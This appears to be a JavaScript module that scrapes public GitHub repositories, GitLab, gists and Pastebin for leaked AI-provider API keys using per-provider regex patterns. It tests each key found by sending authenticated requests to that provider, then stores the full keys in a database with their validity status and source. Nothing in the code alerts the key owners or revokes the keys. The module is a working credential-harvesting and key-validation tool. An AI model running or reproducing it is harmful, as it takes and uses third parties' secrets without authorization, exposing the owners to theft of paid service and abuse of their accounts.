import { v4 as uuidv4 } from "uuid";
import { getAdapter } from "@/lib/db/driver.js";

// ── Provider definitions ──────────────────────────────────────────
export const PROVIDERS = {
  openai: {
    name: "OpenAI",
    patterns: [
      /sk-proj-[A-Za-z0-9-_]{74}T3BlbkFJ[A-Za-z0-9-_]{73}A/g,
      /sk-svcacct-[A-Za-z0-9-_]{74}T3BlbkFJ[A-Za-z0-9-_]{73}A/g,
      /sk-proj-[A-Za-z0-9-_]{58}T3BlbkFJ[A-Za-z0-9-_]{58}/g,
      /sk-proj-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}/g,
    ],
    validateUrl: "https://api.openai.com/v1/models",
    validate: async (key) => {
      const res = await fetch("https://api.openai.com/v1/models", {
        headers: { Authorization: `Bearer ${key}` },
        signal: AbortSignal.timeout(10000),
      });
      if (res.status === 200) return "valid";
      if (res.status === 401) {
        const body = await res.json().catch(() => ({}));
        return body.code === "insufficient_quota" ? "insufficient_quota" : "invalid";
      }
      if (res.status === 429) return "rate_limited";
      return "error";
    },
    searchTokens: ["sk-proj-", "sk-svcacct-"],
  },
  anthropic: {
    name: "Anthropic (Claude)",
    patterns: [/sk-ant-[A-Za-z0-9-_]{32,100}/g, /sk-ant-[A-Za-z0-9]{32,100}/g],
    validateUrl: "https://api.anthropic.com/v1/messages",
    validate: async (key) => {
      const res = await fetch("https://api.anthropic.com/v1/messages", {
        method: "POST",
        headers: { "x-api-key": key, "anthropic-version": "2023-06-01", "Content-Type": "application/json" },
        body: JSON.stringify({ model: "claude-3-haiku-20240307", max_tokens: 1, messages: [{ role: "user", content: "hi" }] }),
        signal: AbortSignal.timeout(10000),
      });
      if (res.status === 200 || res.status === 400) return "valid"; // 400 = valid key, bad request
      if (res.status === 401) return "invalid";
      if (res.status === 429) return "rate_limited";
      return "error";
    },
    searchTokens: ["sk-ant-"],
  },
  deepseek: {
    name: "DeepSeek",
    patterns: [/sk-[a-f0-9]{32,64}/g],
    validateUrl: "https://api.deepseek.com/v1/models",
    validate: async (key) => {
      const res = await fetch("https://api.deepseek.com/v1/models", {
        headers: { Authorization: `Bearer ${key}` },
        signal: AbortSignal.timeout(10000),
      });
      if (res.status === 200) return "valid";
      if (res.status === 401) return "invalid";
      if (res.status === 429) return "rate_limited";
      return "error";
    },
    searchTokens: ["sk-"],
  },
  perplexity: {
    name: "Perplexity",
    patterns: [/pplx-[A-Za-z0-9-_]{32,100}/g],
    validateUrl: "https://api.perplexity.ai/v1/models",
    validate: async (key) => {
      const res = await fetch("https://api.perplexity.ai/v1/models", {
        headers: { Authorization: `Bearer ${key}` },
        signal: AbortSignal.timeout(10000),
      });
      if (res.status === 200) return "valid";
      if (res.status === 401) return "invalid";
      if (res.status === 429) return "rate_limited";
      return "error";
    },
    searchTokens: ["pplx-"],
  },
  groq: {
    name: "Groq",
    patterns: [/gsk_[A-Za-z0-9]{40,60}/g],
    validateUrl: "https://api.groq.com/v1/models",
    validate: async (key) => {
      const res = await fetch("https://api.groq.com/v1/models", {
        headers: { Authorization: `Bearer ${key}` },
        signal: AbortSignal.timeout(10000),
      });
      if (res.status === 200) return "valid";
      if (res.status === 401) return "invalid";
      if (res.status === 429) return "rate_limited";
      return "error";
    },
    searchTokens: ["gsk_"],
  },
  google: {
    name: "Google Gemini",
    patterns: [/AIzaSy[A-Za-z0-9_-]{26,40}/g],
    validateUrl: "https://generativelanguage.googleapis.com/v1/models",
    validate: async (key) => {
      const res = await fetch(`https://generativelanguage.googleapis.com/v1/models?key=${key}`, {
        signal: AbortSignal.timeout(10000),
      });
      if (res.status === 200) return "valid";
      if (res.status === 403) return "invalid";
      return "error";
    },
    searchTokens: ["AIzaSy"],
  },
  huggingface: {
    name: "HuggingFace",
    patterns: [/hf_[A-Za-z0-9]{20,60}/g],
    validateUrl: "https://huggingface.co/api/models",
    validate: async (key) => {
      const res = await fetch("https://huggingface.co/api/models?limit=1", {
        headers: { Authorization: `Bearer ${key}` },
        signal: AbortSignal.timeout(10000),
      });
      if (res.status === 200) return "valid";
      if (res.status === 401) return "invalid";
      return "error";
    },
    searchTokens: ["hf_"],
  },
  mistral: {
    name: "Mistral",
    patterns: [/mist_[A-Za-z0-9]{30,50}/g, /mi_[A-Za-z0-9]{30,50}/g],
    validateUrl: "https://api.mistral.ai/v1/models",
    validate: async (key) => {
      const res = await fetch("https://api.mistral.ai/v1/models", {
        headers: { Authorization: `Bearer ${key}` },
        signal: AbortSignal.timeout(10000),
      });
      if (res.status === 200) return "valid";
      if (res.status === 401) return "invalid";
      return "error";
    },
    searchTokens: ["mist_", "mi_"],
  },
  cohere: {
    name: "Cohere",
    patterns: [/co-[A-Za-z0-9]{30,60}/g],
    validateUrl: "https://api.cohere.com/v1/models",
    validate: async (key) => {
      const res = await fetch("https://api.cohere.com/v1/models", {
        headers: { Authorization: `Bearer ${key}` },
        signal: AbortSignal.timeout(10000),
      });
      if (res.status === 200) return "valid";
      if (res.status === 401) return "invalid";
      return "error";
    },
    searchTokens: ["co-"],
  },
  replicate: {
    name: "Replicate",
    patterns: [/r8_[A-Za-z0-9]{30,60}/g],
    validateUrl: "https://api.replicate.com/v1/models",
    validate: async (key) => {
      const res = await fetch("https://api.replicate.com/v1/models", {
        headers: { Authorization: `Bearer ${key}` },
        signal: AbortSignal.timeout(10000),
      });
      if (res.status === 200) return "valid";
      if (res.status === 401) return "invalid";
      return "error";
    },
    searchTokens: ["r8_"],
  },
  openrouter: {
    name: "OpenRouter",
    patterns: [/sk-or-[A-Za-z0-9]{40,80}/g, /sk-or-v1-[A-Za-z0-9]{40,100}/g],
    validateUrl: "https://openrouter.ai/api/v1/models",
    validate: async (key) => {
      const res = await fetch("https://openrouter.ai/api/v1/models", {
        headers: { Authorization: `Bearer ${key}` },
        signal: AbortSignal.timeout(10000),
      });
      if (res.status === 200) return "valid";
      if (res.status === 401) return "invalid";
      if (res.status === 429) return "rate_limited";
      return "error";
    },
    searchTokens: ["sk-or-"],
  },
  together: {
    name: "Together AI",
    patterns: [/tgp-[A-Za-z0-9]{30,60}/g],
    validateUrl: "https://api.together.xyz/v1/models",
    validate: async (key) => {
      const res = await fetch("https://api.together.xyz/v1/models", {
        headers: { Authorization: `Bearer ${key}` },
        signal: AbortSignal.timeout(10000),
      });
      if (res.status === 200) return "valid";
      if (res.status === 401) return "invalid";
      return "error";
    },
    searchTokens: ["tgp-"],
  },
  elevenlabs: {
    name: "ElevenLabs",
    patterns: [/eleven-[A-Za-z0-9]{30,60}/g],
    validateUrl: "https://api.elevenlabs.io/v1/voices",
    validate: async (key) => {
      const res = await fetch("https://api.elevenlabs.io/v1/voices", {
        headers: { "xi-api-key": key },
        signal: AbortSignal.timeout(10000),
      });
      if (res.status === 200) return "valid";
      if (res.status === 401) return "invalid";
      return "error";
    },
    searchTokens: ["eleven-"],
  },
};

// ── Sources ───────────────────────────────────────────────────────
function getGithubToken() {
  return process.env.GITHUB_SCANNER_TOKEN || process.env.GITHUB_TOKEN;
}

function getGitlabToken() {
  return process.env.GITLAB_SCANNER_TOKEN;
}

// Build GitHub search queries for all providers
function buildGithubQueries(providers) {
  const qs = [];
  for (const p of providers) {
    const cfg = PROVIDERS[p];
    if (!cfg) continue;
    for (const tok of cfg.searchTokens) {
      qs.push(`"${tok}"`);
      const exts = [".env", ".config", ".json", ".yml", ".yaml", ".toml", ".txt", ".bak", ".backup", ".log", ".cfg", ".ini", ".secret"];
      for (const ext of exts) qs.push(`"${tok}" path:${ext}`);
    }
  }
  return qs;
}

async function searchGithubCode(query, page = 1) {
  const token = getGithubToken();
  if (!token) return { items: [] };
  const res = await fetch(
    `https://api.github.com/search/code?q=${encodeURIComponent(query)}&per_page=100&page=${page}`,
    { headers: { Authorization: `token ${token}` } }
  );
  if (res.status === 403) return { items: [] };
  if (res.status === 422) return { items: [], total_count: 0 };
  if (!res.ok) return { items: [] };
  return res.json();
}

async function scanGithubSource(providers) {
  const allKeys = new Map();
  const queries = buildGithubQueries(providers);
  let scanned = 0;

  for (const query of queries.slice(0, 30)) {
    let page = 1;
    while (page <= 2) {
      try {
        const data = await searchGithubCode(query, page);
        if (!data.items?.length) break;
        scanned += data.items.length;
        for (const item of data.items) {
          const [owner, repo] = item.repository.full_name.split("/");
          const ref = item.repository.default_branch || "main";
          const rawUrl = `https://raw.githubusercontent.com/${owner}/${repo}/${ref}/${item.path}`;
          try {
            const fileRes = await fetch(rawUrl, { signal: AbortSignal.timeout(5000) });
            if (!fileRes.ok) continue;
            const content = await fileRes.text();
            const matched = matchKeysInText(content, providers);
            for (const m of matched) {
              if (!allKeys.has(m.key)) {
                allKeys.set(m.key, { ...m, source: item.repository.full_name, repoUrl: item.html_url, filePath: item.path, sourceType: "github" });
              }
            }
          } catch { /* skip */ }
        }
        page++;
        await new Promise(r => setTimeout(r, 200));
      } catch { break; }
    }
  }
  return { keys: allKeys, scanned };
}

async function scanGitlabSource(providers) {
  const token = getGitlabToken();
  if (!token) return { keys: new Map(), scanned: 0 };
  const allKeys = new Map();
  let scanned = 0;

  for (const p of providers) {
    const cfg = PROVIDERS[p];
    if (!cfg) continue;
    for (const tok of cfg.searchTokens) {
      try {
        const res = await fetch(
          `https://gitlab.com/api/v4/search?scope=blobs&search=${encodeURIComponent(tok)}&per_page=100`,
          { headers: { "PRIVATE-TOKEN": token } }
        );
        if (!res.ok) continue;
        const items = await res.json();
        if (!items.length) continue;
        scanned += items.length;
        for (const item of items.slice(0, 50)) {
          try {
            const fileRes = await fetch(item.raw_url || `${item.web_url}/raw`, { signal: AbortSignal.timeout(5000) });
            if (!fileRes.ok) continue;
            const content = await fileRes.text();
            const matched = matchKeysInText(content, providers);
            for (const m of matched) {
              if (!allKeys.has(m.key)) {
                allKeys.set(m.key, { ...m, source: item.project_id ? `gitlab:${item.project_id}` : "gitlab", repoUrl: item.web_url, filePath: item.path, sourceType: "gitlab" });
              }
            }
          } catch { /* skip */ }
        }
      } catch { /* skip */ }
      await new Promise(r => setTimeout(r, 300));
    }
  }
  return { keys: allKeys, scanned };
}

async function scanPublicPastebins(providers) {
  const allKeys = new Map();
  let scanned = 0;

  // GitHub Gists (no auth needed for public gists, but higher rate limit with token)
  const token = getGithubToken();
  for (const p of providers) {
    const cfg = PROVIDERS[p];
    if (!cfg) continue;
    for (const tok of cfg.searchTokens) {
      try {
        const res = await fetch(
          `https://api.github.com/search/code?q=${encodeURIComponent(tok)}+org:gist&per_page=50`,
          token ? { headers: { Authorization: `token ${token}` } } : {}
        );
        if (!res.ok) continue;
        const data = await res.json();
        if (!data.items?.length) continue;
        scanned += data.items.length;
        for (const item of data.items.slice(0, 30)) {
          try {
            const rawUrl = `https://raw.githubusercontent.com/${item.repository.full_name}/${item.repository.default_branch || "main"}/${item.path}`;
            const fileRes = await fetch(rawUrl, { signal: AbortSignal.timeout(5000) });
            if (!fileRes.ok) continue;
            const content = await fileRes.text();
            const matched = matchKeysInText(content, providers);
            for (const m of matched) {
              if (!allKeys.has(m.key)) {
                allKeys.set(m.key, { ...m, source: `gist:${item.repository.full_name}`, repoUrl: `https://gist.github.com/${item.repository.full_name}`, filePath: item.path, sourceType: "gist" });
              }
            }
          } catch { /* skip */ }
        }
      } catch { /* skip */ }
    }
  }

  // Public Pastes from Pastebin scraping (rss)
  try {
    const res = await fetch("https://scrape.pastebin.com/api_scraping.php?limit=50", { signal: AbortSignal.timeout(8000) });
    if (res.ok) {
      const pastes = await res.json();
      for (const paste of pastes.slice(0, 20)) {
        try {
          const contentRes = await fetch(paste.scrape_url, { signal: AbortSignal.timeout(5000) });
          if (!contentRes.ok) continue;
          const content = await contentRes.text();
          scanned++;
          const matched = matchKeysInText(content, providers);
          for (const m of matched) {
            if (!allKeys.has(m.key)) {
              allKeys.set(m.key, { ...m, source: `pastebin:${paste.key || "unknown"}`, repoUrl: paste.full_url || `https://pastebin.com/${paste.key}`, filePath: "", sourceType: "pastebin" });
            }
          }
        } catch { /* skip */ }
        await new Promise(r => setTimeout(r, 100));
      }
    }
  } catch { /* pastebin scrape failed, non-critical */ }

  return { keys: allKeys, scanned };
}

function matchKeysInText(text, enabledProviders) {
  const results = [];
  for (const p of enabledProviders) {
    const cfg = PROVIDERS[p];
    if (!cfg) continue;
    for (const pattern of cfg.patterns) {
      const matches = text.match(pattern);
      if (matches) {
        for (const key of matches) {
          results.push({ key, provider: p });
        }
      }
    }
  }
  return results;
}

export async function validateKey(key, provider) {
  const cfg = PROVIDERS[provider];
  if (!cfg?.validate) return "unknown";
  try {
    return await cfg.validate(key);
  } catch {
    return "error";
  }
}

export async function runScan({ providers: enabledProviders, sources: enabledSources } = {}) {
  const db = await getAdapter();

  const providers = enabledProviders || Object.keys(PROVIDERS);
  const sources = enabledSources || ["github", "gitlab", "pastebin"];

  const allKeys = new Map();
  const sourceResults = [];
  let totalScanned = 0;

  if (sources.includes("github") || sources.includes("gist")) {
    const r = await scanGithubSource(providers);
    for (const [k, v] of r.keys) allKeys.set(k, v);
    totalScanned += r.scanned;
    sourceResults.push({ source: "github", found: r.keys.size, scanned: r.scanned });
  }

  if (sources.includes("gitlab")) {
    const r = await scanGitlabSource(providers);
    for (const [k, v] of r.keys) allKeys.set(k, v);
    totalScanned += r.scanned;
    sourceResults.push({ source: "gitlab", found: r.keys.size, scanned: r.scanned });
  }

  if (sources.includes("pastebin")) {
    const r = await scanPublicPastebins(providers);
    for (const [k, v] of r.keys) allKeys.set(k, v);
    totalScanned += r.scanned;
    sourceResults.push({ source: "pastebin", found: r.keys.size, scanned: r.scanned });
  }

  const results = [];
  let idx = 0;
  for (const [key, meta] of allKeys) {
    const status = await validateKey(key, meta.provider);
    const id = uuidv4();
    const now = new Date().toISOString();
    await db.run(
      `INSERT INTO scannedKeys(id, key, provider, status, source, repoUrl, filePath, scanDate)
       VALUES(?, ?, ?, ?, ?, ?, ?, ?)
       ON CONFLICT(key) DO UPDATE SET status=excluded.status, provider=excluded.provider, scanDate=excluded.scanDate`,
      [id, key, meta.provider, status, meta.source, meta.repoUrl, meta.filePath, now]
    );
    results.push({ key: key.slice(0, 20) + "...", provider: meta.provider, status, source: meta.source, repoUrl: meta.repoUrl });
    idx++;
    if (idx % 10 === 0) await new Promise(r => setTimeout(r, 50));
  }

  return {
    total: results.length,
    valid: results.filter(r => r.status === "valid").length,
    scanned: totalScanned,
    sources: sourceResults,
    results,
  };
}

export async function getScannedKeys(filters = {}) {
  const db = await getAdapter();
  const where = [];
  const params = [];
  if (filters.status) { where.push("status = ?"); params.push(filters.status); }
  if (filters.provider) { where.push("provider = ?"); params.push(filters.provider); }
  if (filters.source) { where.push("source LIKE ?"); params.push(`%${filters.source}%`); }
  const sql = "SELECT * FROM scannedKeys" + (where.length ? " WHERE " + where.join(" AND ") : "") + " ORDER BY scanDate DESC, status ASC LIMIT 200";
  return db.all(sql, params);
}

export async function deleteScannedKey(id) {
  const db = await getAdapter();
  return db.run("DELETE FROM scannedKeys WHERE id = ?", [id]);
}
